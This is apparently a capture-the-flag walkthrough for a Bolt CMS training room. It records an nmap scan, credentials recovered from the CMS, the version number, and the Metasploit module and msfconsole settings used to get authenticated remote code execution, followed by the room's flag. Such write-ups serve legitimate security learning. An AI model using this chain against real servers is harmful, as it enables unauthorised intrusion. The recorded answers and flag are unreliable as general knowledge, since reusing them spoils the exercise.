**A hero is unleashed**

Once you have successfully deployed the VM , enumerate it before finding the flag in the machine.  

Answer the questions below

```
export IP=10.10.105.168
```

| Question                                              | Answer |
| ----------------------------------------------------- | ------ |
| What port number has a web server with a CMS running? | 8000   |
```
nmap -sC -sV -A -T4 -v -p- -oN scans/nmap $IP
```

![[Pasted image 20240422200214.png]]


| Question                                     | Answer |
| -------------------------------------------- | ------ |
| What is the username we can find in the CMS? | bolt   |

![[Pasted image 20240422200529.png]]


| Question                                           | Answer       |
| -------------------------------------------------- | ------------ |
| What is the password we can find for the username? | boltadmin123 |

![[Pasted image 20240422200607.png]]


| Question                                                             | Answer     |
| -------------------------------------------------------------------- | ---------- |
| What version of the CMS is installed on the server? (Ex: Name 1.1.1) | Bolt 3.7.1 |

*Search for Bolt CMS default login page:*

![[Pasted image 20240422202548.png]]


![[Pasted image 20240422202635.png]]


![[Pasted image 20240422202759.png]]



| Question                                                                                                                         | Answer |
| -------------------------------------------------------------------------------------------------------------------------------- | ------ |
| There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID? |        |

![[Pasted image 20240422203124.png]]




| Question                                                                                                                                                                                                                                                                                                | Answer                                     |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)<br><br>Note: If you can't find the exploit module its most likely because your metasploit isn't updated. Run `**apt update**` then `**apt install metasploit-framework**` | exploit/unix/webapp/bolt_authenticated_rce |

![[Pasted image 20240422203419.png]]


| Question                                                                                       | Answer |
| ---------------------------------------------------------------------------------------------- | ------ |
| Set the **LHOST, LPORT, RHOST, USERNAME, PASSWORD** in msfconsole before running the exploit   |        |

![[Pasted image 20240422203603.png]]


```
set LHOST tun0
```

![[Pasted image 20240422203752.png]]

```
set RHOST 10.10.105.168
```

![[Pasted image 20240422204001.png]]

```
set USERNAME bolt
```

![[Pasted image 20240422204047.png]]

```
set PASSWORD boltadmin123
```

![[Pasted image 20240422204132.png]]


| Question                              | Answer                            |
| ------------------------------------- | --------------------------------- |
| Look for flag.txt inside the machine. | THM{wh0_d035nt_l0ve5_b0l7_r1gh7?} |

![[Pasted image 20240422225702.png]]


![[Pasted image 20240422230018.png]]

